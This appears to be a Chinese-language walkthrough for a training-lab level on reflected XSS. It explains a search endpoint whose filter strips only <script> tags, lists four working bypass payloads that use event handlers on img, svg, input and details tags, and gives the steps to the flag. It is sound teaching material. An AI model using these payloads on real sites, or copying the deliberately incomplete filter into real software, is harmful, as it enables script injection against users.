# Level 1 — 反射型XSS

## 关卡说明

本关模拟商品搜索功能，后端对用户输入做了简单的 `<script>` 标签过滤，但未过滤其他HTML事件属性（如 `onerror`、`onload`）。攻击者可以构造绕过过滤的XSS Payload。

**目标**：构造一个绕过 `<script>` 过滤的XSS Payload，触发弹窗或执行JavaScript代码，获取当前关卡的 Flag。

## 漏洞原理

### 代码逻辑分析

后端代码位于 `ReflectedXssController.java`，接口路径：

```
POST /api/challenge/xss/reflected/search
Body: { "query": "用户输入" }
```

**过滤逻辑**：

```java
// 仅过滤 script 标签（不区分大小写）
String filteredQuery = query.replaceAll("(?i)</?script[^>]*>", "");
```

**漏洞点**：只过滤了 `<script>` 标签，未过滤 `<img>`、`<svg>`、`<iframe>` 等标签及其事件属性。

### 有效的Payload列表

| Payload | 原理 |
|---------|------|
| `"><img src=x onerror=alert(1)>` | img标签+onerror事件 |
| `"><svg onload=alert(1)>` | svg标签+onload事件 |
| `"><input onfocus=alert(1) autofocus>` | input标签+自动聚焦 |
| `"><details open ontoggle=alert(1)>` | details标签+ontoggle |

## 通关步骤

### Step 1：测试基本输入

输入普通文字，观察搜索结果中如何展示搜索词。

### Step 2：尝试 `<script>` 标签

输入 `<script>alert(1)</script>`，观察到 `<script>` 标签被过滤。

### Step 3：绕过过滤

使用不依赖 `<script>` 的Payload，如 `"><img src=x onerror=alert(1)>`

### Step 4：获取 Flag

Payload匹配成功后，响应中包含 Flag。

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/xss/ReflectedXssController.java` | 后端搜索接口，过滤不完整 |
| `service/FlagService.java` | Flag 获取与验证 |
